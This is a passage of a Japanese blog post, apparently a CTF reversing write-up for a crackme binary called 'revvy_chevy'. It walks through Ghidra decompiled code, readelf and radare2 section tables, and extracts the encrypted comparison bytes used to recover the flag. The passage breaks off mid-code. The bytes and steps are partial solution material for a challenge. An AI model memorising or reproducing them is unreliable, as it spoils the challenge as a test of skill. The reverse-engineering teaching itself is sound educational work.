&lt;h3 id=&quot;暗号化されたバイト列をチェックする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%95%E3%82%8C%E3%81%9F%E3%83%90%E3%82%A4%E3%83%88%E5%88%97%E3%82%92%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%81%99%E3%82%8B&quot; aria-label=&quot;暗号化されたバイト列をチェックする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;暗号化されたバイト列をチェックする&lt;/h3&gt;
&lt;p&gt;ここでは、先ほどXOR暗号化された&lt;code class=&quot;language-text&quot;&gt;input_text&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;PTR_DAT_00104010&lt;/code&gt;に定義されたバイト列を0x40バイト分比較して、一致するかどうかをチェックしています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;iVar2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input_text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;PTR_DAT_00104010&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;iVar2 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;You got it!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;That\&apos;s not it...&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    iVar2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;恐らく、最初の入力で与えられた文字列が正しいフラグの場合は、XOR暗号化された結果と&lt;code class=&quot;language-text&quot;&gt;PTR_DAT_00104010&lt;/code&gt;に定義されているバイト値と同じになるのだと思われます。&lt;/p&gt;
&lt;h3 id=&quot;データセクションの値を取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%83%BC%E3%82%BF%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%80%A4%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;データセクションの値を取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;データセクションの値を取得する&lt;/h3&gt;
&lt;p&gt;続いて、&lt;code class=&quot;language-text&quot;&gt;PTR_DAT_00104010&lt;/code&gt;に定義されている値を確認していきましょう。&lt;/p&gt;
&lt;p&gt;ELFバイナリの場合、事前定義された文字列などのデータは&lt;code class=&quot;language-text&quot;&gt;.data&lt;/code&gt;セクションに格納されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Data_segment&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Data segment - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.data&lt;/code&gt;セクションは読み書きが可能な領域なので、書き換え可能な変数などがこのセクションに格納されます。&lt;/p&gt;
&lt;p&gt;Ghidaのデコンパイル結果から&lt;code class=&quot;language-text&quot;&gt;PTR_DAT_00104010&lt;/code&gt;をクリックすることでも、このデータが定義されたセクションにジャンプすることが可能ですが、せっかくなので&lt;code class=&quot;language-text&quot;&gt;.data&lt;/code&gt;セクションのオフセットを先に特定しようと思います。&lt;/p&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;readelf -S&lt;/code&gt;を使って表層解析を行います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ readelf -S revvy_chevy 
There are &lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt; section headers, starting at offset 0x3150:

Section Headers:
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Nr&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Name              Type             Address           Offset       Size              EntSize          Flags  Link  Info  Align
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; .data             PROGBITS         0000000000004000  00003000       0000000000000018  0000000000000000  WA       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;     &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;     &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この出力結果から、仮想アドレス&lt;code class=&quot;language-text&quot;&gt;0x4000&lt;/code&gt;から0x18バイト分の範囲に&lt;code class=&quot;language-text&quot;&gt;.data&lt;/code&gt;セクションが存在することがわかりました。&lt;/p&gt;
&lt;p&gt;続いて今度はradare2の解析で&lt;code class=&quot;language-text&quot;&gt;iS&lt;/code&gt;コマンドを使ってセクションテーブルを取得してみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00001100&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; iS
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Sections&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;   0x00000000    0x0 0x00000000    0x0 ---- 
&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;   0x00000318   0x1c 0x00000318   0x1c -r-- .interp
&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;   0x00000338   0x20 0x00000338   0x20 -r-- .note.gnu.property
&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;   0x00000358   0x24 0x00000358   0x24 -r-- .note.gnu.build_id
&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;   0x0000037c   0x20 0x0000037c   0x20 -r-- .note.ABI_tag
&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;   0x000003a0   0x28 0x000003a0   0x28 -r-- .gnu.hash
&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;   0x000003c8  0x138 0x000003c8  0x138 -r-- .dynsym
&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;   0x00000500   0xd1 0x00000500   0xd1 -r-- .dynstr
&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;   0x000005d2   0x1a 0x000005d2   0x1a -r-- .gnu.version
&lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt;   0x000005f0   0x40 0x000005f0   0x40 -r-- .gnu.version_r
&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;  0x00000630   0xf0 0x00000630   0xf0 -r-- .rela.dyn
&lt;span class=&quot;token number&quot;&gt;11&lt;/span&gt;  0x00000720   0x90 0x00000720   0x90 -r-- .rela.plt
&lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;  0x00001000   0x1b 0x00001000   0x1b -r-x .init
&lt;span class=&quot;token number&quot;&gt;13&lt;/span&gt;  0x00001020   0x70 0x00001020   0x70 -r-x .plt
&lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;  0x00001090   0x10 0x00001090   0x10 -r-x .plt.got
&lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;  0x000010a0   0x60 0x000010a0   0x60 -r-x .plt.sec
&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;  0x00001100  0x2b5 0x00001100  0x2b5 -r-x .text
&lt;span class=&quot;token number&quot;&gt;17&lt;/span&gt;  0x000013b8    0xd 0x000013b8    0xd -r-x .fini
&lt;span class=&quot;token number&quot;&gt;18&lt;/span&gt;  0x00002000   0x81 0x00002000   0x81 -r-- .rodata
&lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  0x00002084   0x4c 0x00002084   0x4c -r-- .eh_frame_hdr
&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;  0x000020d0  0x128 0x000020d0  0x128 -r-- .eh_frame
&lt;span class=&quot;token number&quot;&gt;21&lt;/span&gt;  0x00002d90    0x8 0x00003d90    0x8 -rw- .init_array
&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;  0x00002d98    0x8 0x00003d98    0x8 -rw- .fini_array
&lt;span class=&quot;token number&quot;&gt;23&lt;/span&gt;  0x00002da0  0x1f0 0x00003da0  0x1f0 -rw- .dynamic
&lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;  0x00002f90   0x70 0x00003f90   0x70 -rw- .got
&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;  0x00003000   0x18 0x00004000   0x18 -rw- .data
&lt;span class=&quot;token number&quot;&gt;26&lt;/span&gt;  0x00003018    0x0 0x00004020   0x10 -rw- .bss
&lt;span class=&quot;token number&quot;&gt;27&lt;/span&gt;  0x00003018   0x2a 0x00000000   0x2a ---- .comment
&lt;span class=&quot;token number&quot;&gt;28&lt;/span&gt;  0x00003042  0x10a 0x00000000  0x10a ---- .shstrtab&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;こちらの結果でも、仮想アドレス&lt;code class=&quot;language-text&quot;&gt;0x4000&lt;/code&gt;から0x18バイト分の範囲に&lt;code class=&quot;language-text&quot;&gt;.data&lt;/code&gt;セクションが存在することがわかりました。&lt;/p&gt;
&lt;p&gt;というわけで、実際にGhidraでRVA&lt;code class=&quot;language-text&quot;&gt;0x104000&lt;/code&gt;の逆アセンブル結果を見てみます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/962c13d85d306c44871ed4059475a46b/0b533/image-40.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 73.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAAB0klEQVQ4y61UaW/bMAzN//9nXVqgGBAUOdolzuX70GFJlOw3Wl4DDM2wDw3tB5qS9UQ+yl48v7zg6ccSy+UzVqsVNpst1ust3lYbvO8+sP91QHI44nQ8I80y5HmBsqzQNC3qukaaXuP44XhCkuyxwD0bgCZV6PIesjKQtUHwI/5n2lgsnHOwDPIEISSIBoZHVWkobUHBYxwnsjHe1lto0jxO6GwHYQVa00IaAaV6LLz38GHgQOH19SeKws27KULPGxW6jfFMOvthHGY/hPgc2I98KX2X0MaFzgXQ4FH27a2kT9J/2Y2QfMBU+uVygRQ+6iU6g04YNFLDWn6HQlzkeRMXHGfloZ3iKgwssWzecFJ6JrRECJzlpGWWB54YIJVlTR20Jn52MEw65edYO+Nd1FYYCWX6KI2mHmIm5Gb0hHNDSAqFdeKR5ITdWWF30TiwBKfKIZcBmQg4tT2SRrE3eC9r7EuDQo4o1IhLpWZCZQiFIFx5YHvwSJsQ41J6XGsXUevwBZXi03CLB2TNn5Idl/w9m5ulP5syEU4d/A7+6nIkxAMJrXtMhlKzhiGEeA4fYf30LRtjULcdrkWDtOq+ouS5srs/x8iqFlXdoOa/z/ma4jczAo61zxnO7QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/962c13d85d306c44871ed4059475a46b/8ac56/image-40.webp 240w,
/static/962c13d85d306c44871ed4059475a46b/d3be9/image-40.webp 480w,
/static/962c13d85d306c44871ed4059475a46b/b0a15/image-40.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/962c13d85d306c44871ed4059475a46b/8ff5a/image-40.png 240w,
/static/962c13d85d306c44871ed4059475a46b/e85cb/image-40.png 480w,
/static/962c13d85d306c44871ed4059475a46b/0b533/image-40.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/962c13d85d306c44871ed4059475a46b/0b533/image-40.png&quot;
            alt=&quot;2021/12/image-40.png&quot;
            title=&quot;2021/12/image-40.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;0x18バイト目までの範囲でデータが格納されています。&lt;/p&gt;
&lt;p&gt;今回のターゲットは&lt;code class=&quot;language-text&quot;&gt;PTR_DAT_00104010&lt;/code&gt;の値ですが、.dataセクションにはポインタとして格納されているようです。&lt;/p&gt;
&lt;p&gt;そのため、このポインタが指している&lt;code class=&quot;language-text&quot;&gt;DAT_00102040&lt;/code&gt;にさらにジャンプしてみます。&lt;/p&gt;
&lt;p&gt;バイト列が格納されていますね。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/9ad5b785a98ef92dd33995f354f871a0/0b533/image-41.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 85.83333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAARlAAAEZQAGA43XUAAABzklEQVQ4y5WU227iMBCGef9n6QO0V7viplK1q24FSC0FtiTk4DhH0tiOc/g7MZQSiiAdaeRxrHz652CPxuM5fv1eYTxe4ObmHrd3czw8rI3//bfGn6f/eH1lWK0YLJvD82JwniBNM6RJF3MEYQjGfDy/zDFq6hKdpaqGHcSIigYZfdqwAgEFoaywLbvzFpkCvLwAe1dwtwWsJIObCdgEj0WLteNjlOfvKHWNNBd4fJrB8Qoo3SIhWCYUvG1m9lI3tDZmNXH1FUv6v6xaWI6HkRACdd2gLBVm0xmlIIziUlVQpD4SKYbaxt0DKwJKpTAlYBDsgFJUkBWlXGRm37btRe8BawOUBsi5NIeKaicqhUTmB+A5Owa+bfw+cHYElHKnMBJ9hWi/A7EHLm32XWEYfgEVAY8VnlN5AXhSwz3wtIaXFfpDgOlV4Kfy1dWUa20U7jhDUvYvA7umxGI7WKG1ORmbyWRKd1IcAVUPeG1seoOtqIYGGIj+2PxgsG3nAKwJsFPIebG/KfoAvAbrATtl3V5rbQY7CpU51GUD3Vb0yuSD77LjUVPiODZvm+UyPE6esXgL4NN7Z7sRbMaxpLp4QQKPn3fGI2pkBE4+XyzxAXQZI0VnO6DXAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/9ad5b785a98ef92dd33995f354f871a0/8ac56/image-41.webp 240w,
/static/9ad5b785a98ef92dd33995f354f871a0/d3be9/image-41.webp 480w,
/static/9ad5b785a98ef92dd33995f354f871a0/b0a15/image-41.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/9ad5b785a98ef92dd33995f354f871a0/8ff5a/image-41.png 240w,
/static/9ad5b785a98ef92dd33995f354f871a0/e85cb/image-41.png 480w,
/static/9ad5b785a98ef92dd33995f354f871a0/0b533/image-41.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/9ad5b785a98ef92dd33995f354f871a0/0b533/image-41.png&quot;
            alt=&quot;2021/12/image-41.png&quot;
            title=&quot;2021/12/image-41.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;最終的に&lt;code class=&quot;language-text&quot;&gt;iVar2 = memcmp(&amp;amp;input_text,PTR_DAT_00104010,0x40);&lt;/code&gt;の行では、このアドレス&lt;code class=&quot;language-text&quot;&gt;0x104010&lt;/code&gt;の先頭から0x40バイト分のデータを参照しています。&lt;/p&gt;
&lt;p&gt;このままだと見づらいので、Ghidraの機能を使ってこのデータを整形して取得します。&lt;/p&gt;
&lt;p&gt;今回は後でPythonスクリプトで使いたいので、Pythonの配列形式で取得することにしました。&lt;/p&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;0x104000&lt;/code&gt;から0x40バイト分の範囲を選択して右クリックします。&lt;/p&gt;
&lt;p&gt;次に[Copy Special]を押して、[Python List]を選択します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3f51f7a9ce08c748b38830f87a23237c/0b533/image-42.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 78.75000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAARlAAAEZQAGA43XUAAACvElEQVQ4y3WT3VPaUBDF/f+nD31ApdM+tQrYqkASRFFxHAeFkAQIoK0KIiqEfEFAKAbJ6SYgiFbubDKX3PnNObvnLsW4CwQYAZ+5KD6FNvElsY/vqQOsnSbx45Te6X2E5WOw5yfYu04heZvGSYNHRhfB6zxSjROklDQObpPI1SQsgX4KGgg+rcNX9iFgMWDBYMuOYJvW2jBEu+hsRaYrPK2I95Whk2FkewQcDx3UR/cI9kJYlv0ImRwBOWwPWIRtBsHHTbBjDpwTmxXrcAvl/hchrNjNYcmxHdw9PyDwGMRK0Y+NzhT4l1Q6YVK44R0Oz7S5mth3UPe78BoYJKCrMGjOgXvNQyTujsiKCLGfQ8YSke4JiD3H51B8BOy7wFUEjMmhrQGD/O8iZKGEUuEcatOAqVpoqTp27YTXt9fAiAeUFoG+wir1kJ0BpasCLi+vULmpQlFb0HQDTb2F3dF7oKtQfKvQRwpDbXY6FAbC+jeUl/142NmBaRjQNBNNrfWBwii1g3/bQxc4tyz+kVGt1EmZSQp1KC0d9WYT8acE4RaB7v64d/Z+KK+BwoWEbEZALp/HdaUC3QXr6qJCZw486mUo2DYIeE+xCWClRLGxOG+CW4Mo+HIW2TQPURRRq9XIdhstQ531cHIFJhX1gGkK9tMY988NbPR+wl/8is1OHDHEEenHwJeykAQJpXIJiqLAIIUNGk7CPvTCHBvTWSfuvd39kcW/B/5qx7EzBYoXeQhZCQW5SH3UoakGGpr6IfC4y7uWnQXLoc6LZQa5ywLkvEwKy6hUq55lhWITt/cmlp2pZYf17nmym3lz9VxgOzaJzZBFuiSgKJ/junpDE1apDNSV5n+H4sXGomCP7BH69gDGyIQxNNAZWzBHbah9AzmymkqdQZTyUCk2KllWWhoMuw2LVseh50vR0roG/gHXUlMEvl5jCQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3f51f7a9ce08c748b38830f87a23237c/8ac56/image-42.webp 240w,
/static/3f51f7a9ce08c748b38830f87a23237c/d3be9/image-42.webp 480w,
/static/3f51f7a9ce08c748b38830f87a23237c/b0a15/image-42.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3f51f7a9ce08c748b38830f87a23237c/8ff5a/image-42.png 240w,
/static/3f51f7a9ce08c748b38830f87a23237c/e85cb/image-42.png 480w,
/static/3f51f7a9ce08c748b38830f87a23237c/0b533/image-42.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3f51f7a9ce08c748b38830f87a23237c/0b533/image-42.png&quot;
            alt=&quot;2021/12/image-42.png&quot;
            title=&quot;2021/12/image-42.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;すると、次のようにPythonの配列として利用できる形式でバイナリデータを取得することができました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; 0x74, 0x1a, 0x95, 0x4e, 0xba, 0xdb, 0x47, 0x64, 0x09, 0x2d, 0xd1, 0xbf, 0x8a, 0x9d, 0xde, 0x5a, 0xd7, 0x5c, 0x93, 0x16, 0x09, 0x3b, 0x30, 0x6f, 0x97, 0x40, 0xd0, 0x7c, 0x57, 0xdb, 0xde, 0x0c, 0x09, 0xa0, 0x84, 0x9b, 0x8a, 0x76, 0x2f, 0xb1, 0x57, 0xa2, 0xe1, 0x4f, 0xb9, 0x6f, 0x81, 0xbf, 0xb9, 0xbf, 0xe1, 0xef, 0x79, 0xcf, 0x01, 0xdf, 0xf9, 0x9f, 0xe1, 0x8f, 0x39, 0x2f, 0x81, 0xff, 0x00 &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;他にも様々なデータ型への変換やコピーの方法があるので、必要に応じて使い分けると解析をスムーズに行うことができます。&lt;/p&gt;
&lt;h2 id=&quot;xor暗号化時の関数を解析する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#xor%E6%9A%97%E5%8F%B7%E5%8C%96%E6%99%82%E3%81%AE%E9%96%A2%E6%95%B0%E3%82%92%E8%A7%A3%E6%9E%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;xor暗号化時の関数を解析する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;XOR暗号化時の関数を解析する&lt;/h2&gt;
&lt;p&gt;もう少し静的解析を続けていきます。&lt;/p&gt;
&lt;p&gt;先ほど解析した以下のXOR暗号化を行う処理の中に、&lt;code class=&quot;language-text&quot;&gt;FUN_001011e9&lt;/code&gt;という関数を実行している行がありました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    cVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;FUN_001011e9&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;input_text &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lVar5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; 